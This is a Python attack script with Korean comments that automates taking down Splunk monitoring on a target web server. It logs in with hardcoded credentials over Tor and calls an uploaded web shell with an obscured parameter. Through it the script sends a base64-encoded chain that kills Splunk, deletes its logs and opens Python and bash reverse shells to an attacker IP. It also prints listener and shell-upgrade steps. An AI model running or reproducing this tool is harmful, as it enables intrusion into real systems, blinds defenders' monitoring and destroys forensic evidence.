#!/usr/bin/env python3
"""
Splunk 자동 무력화
사용자 입력 없이 바로 실행
"""

import requests
import sys
import urllib.parse
import base64

def auto_kill_splunk(target_ip, attacker_ip, attacker_port):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print("="*60)
    print("Splunk 자동 무력화 공격")
    print("="*60)
    print(f"타겟: {target_ip}")
    print(f"C2: {attacker_ip}:{attacker_port}\n")

    # alice 로그인
    data = {'username': 'alice', 'password': 'alice2024'}
    session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
    print("[+] alice 세션 획득\n")

    print(f"[!] C2 리스너 준비:")
    print(f"    nc -lvnp {attacker_port}\n")

    # 웹쉘 (첫 번째 것 사용)
    selected_shell = "shell_4727.php"

    # 파라미터 (cmd 대신 다른 것 - 탐지 회피)
    selected_param = "x"  # 또는 c, e

    # 올인원 명령: Splunk 죽이기 + 리버스 쉘
    all_in_one_cmd = " && ".join([
        # Splunk 무력화
        "pkill -9 splunkd 2>/dev/null",
        "pkill -9 splunk 2>/dev/null",
        "/opt/splunk/bin/splunk stop 2>/dev/null",
        "/opt/splunkforwarder/bin/splunk stop 2>/dev/null",
        "systemctl stop Splunkd 2>/dev/null",
        "rm -rf /opt/splunk/var/log/splunk/* 2>/dev/null",
        # 리버스 쉘 (여러 방법 동시)
        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &",
        f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1 &",
    ])

    # Base64 인코딩
    b64_cmd = base64.b64encode(all_in_one_cmd.encode()).decode()
    final_cmd = f"echo {b64_cmd}|base64 -d|bash &"

    final_url = f"{base_url}/file.php?name=uploads/{selected_shell}&{selected_param}={urllib.parse.quote(final_cmd)}"

    print(f"[*] 공격 시나리오:")
    print(f"    1. pkill -9 splunkd (Splunk 프로세스 강제 종료)")
    print(f"    2. systemctl stop Splunkd (서비스 중단)")
    print(f"    3. rm -rf /opt/splunk/var/log/* (로그 삭제)")
    print(f"    4. 리버스 쉘 실행 (Python + Bash)")
    print(f"\n[*] 웹쉘: {selected_shell}")
    print(f"[*] 파라미터: {selected_param}")
    print(f"[*] 인코딩: Base64")
    print(f"[*] 백그라운드: 예\n")

    print(f"{'='*60}")
    print(f"[*] 공격 시작!")
    print(f"{'='*60}\n")

    try:
        resp = session.get(final_url, timeout=15)

        print(f"[+] 응답 수신:")
        print(f"    Status: {resp.status_code}")
        print(f"    크기: {len(resp.text)} bytes")

        if resp.status_code == 200:
            print(f"\n[+] ✅ 200 OK - 명령 전송 성공!")

            if len(resp.text.strip()) > 0:
                print(f"\n[*] 응답 내용:")
                print(f"{resp.text[:300]}")

        else:
            print(f"\n[?] Status: {resp.status_code}")

    except requests.exceptions.Timeout:
        print(f"[+] ✅ 타임아웃!")
        print(f"[*] 백그라운드 실행 가능성 높음!")

    except Exception as e:
        print(f"[-] 오류: {str(e)[:100]}")

    print(f"\n{'='*60}")
    print(f"[+] 공격 완료!")
    print(f"{'='*60}")
    print(f"\n[!] 다음 확인:")
    print(f"    1. C2 리스너 (nc -lvnp {attacker_port})")
    print(f"    2. 연결되면: ps aux | grep splunk (Splunk 죽었는지)")
    print(f"    3. Splunk 죽었으면 더 이상 탐지 없음!")
    print(f"    4. 자유롭게 명령 실행 가능")
    print(f"\n[*] 연결 성공 시 TTY 업그레이드:")
    print(f"    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
    print(f"    export TERM=xterm")

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 108_auto_kill_splunk.py <TARGET> <ATTACKER_IP> <PORT>")
        print("예시: python3 108_auto_kill_splunk.py 43.201.154.142 57.181.28.7 4444")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    auto_kill_splunk(target_ip, attacker_ip, attacker_port)

if __name__ == "__main__":
    main()
